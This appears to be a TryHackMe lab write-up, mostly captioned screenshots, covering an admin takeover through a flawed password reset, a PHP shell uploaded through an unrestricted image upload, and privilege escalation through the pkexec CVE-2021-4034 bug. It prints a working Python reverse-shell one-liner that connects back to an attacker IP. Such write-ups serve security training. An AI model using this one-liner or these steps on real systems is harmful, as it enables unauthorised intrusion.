* * *
  ### LAB
  ### PLATFORM: THM
* * *

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3451f8f0-cdf3-4707-b8c8-5ce5585cd963)


### ENUMERATION

- Rustscan's result

 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cdc8bece-c865-440e-9ed9-96f987bcc450)

- Ffuf's result
 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/6338d69a-1020-48ed-9942-49549558e7dd)

- v2 reveals an admin page,we can also register a user

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/059f5f25-684b-4a4a-b791-481f828383ff)

- Profile.php reveals the admin username

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8545b9fe-3838-48f6-90da-b63f54b69ea4)

- The password reset functionality is vulnerable becuase allows us to reset an account's password without any restrictions e,g sending
a magic link to the email
  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/2759ec91-fda5-416c-8d96-6b3ec77ef82b)

- Intercept the request with burpsuite and change the username to the admin's name

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/be0a74d8-0fe2-42f7-846f-de43e010888d)

### GETTING SHELL

- One of the features of the admin account is that it allows the admin to upload a profile image,we can abuse that feature to get a shell

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/09585a99-2045-4c27-bda2-b53fc889ff9f)

- I was able to upload a shell php,the site has no file upload restrictions

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/2b3b466b-2771-4304-992e-35c7b955167d)

- After viewing the source code of "v2/profile.php" ,I discovered that it has a special directory for storing uploaded pictures

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/57f2fb70-6694-40c2-8c59-41139d1d8d77)

- We can execute shell commands now

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/63f5c7d8-31da-4e80-aef5-255eb8854377)

### INITIAL FOOTHOLD

- Shell with `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.158.229",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9e0cd881-585b-419f-bef9-1e54f28965e6)

### PRIVESC WITH POLKIT AND PKEXEC 0.105.0

- POLKIT has an exploit as stated in `cve-2021-4034`.Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).The exploit works on pkexec ver 0.105

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e6c7dbdc-639d-4f27-bb88-886b98848b05)

- ROOT access

    ![z](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/45f2b139-f5cf-4a7b-bd39-6c46cde6fed9)


